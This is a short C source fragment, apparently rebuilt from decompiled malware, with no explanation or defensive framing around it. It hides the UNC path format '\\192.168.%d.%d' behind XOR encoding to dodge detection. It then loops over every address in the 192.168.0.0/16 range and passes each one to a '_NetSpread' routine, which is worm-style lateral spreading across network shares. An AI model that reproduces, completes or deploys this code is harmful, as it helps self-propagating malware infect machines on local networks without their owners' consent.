#include "data_globals.h"
#include <string.h>
#include <stdio.h>
#include <stdbool.h>
#include <stddef.h>  // for size_t

#pragma optimize("", off)
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

DWORD WINAPI _L0cal_4(LPVOID Data)
{
    char local_54[64];
    uint32_t local_14;
    uint32_t local_10;
    LPCSTR param_1 = (LPCSTR)Data;

    // Format string "\\\\192.168.%d.%d" XOR'd with key 0x3E
    volatile char sz_fmt[] = {
        '\\'^0x3E, '\\'^0x3E, '1'^0x3E, '9'^0x3E, '2'^0x3E, '.'^0x3E, '1'^0x3E, '6'^0x3E,
        '8'^0x3E, '.'^0x3E, '%'^0x3E, 'd'^0x3E, '.'^0x3E, '%'^0x3E, 'd'^0x3E, 0x00^0x3E
    };
    xor_decrypt(sz_fmt, sizeof(sz_fmt), 0x3E);

    for (local_10 = 0; local_10 < 0x100; local_10++)
    {
        for (local_14 = 0; local_14 < 0x100; local_14++)
        {
            memset(local_54, 0, sizeof(local_54));
            sprintf(local_54, (char*)sz_fmt, local_10, local_14);
            _NetSpread((uint32_t)local_54, param_1);
        }
    }
    return 0;
}
#pragma optimize("", on)
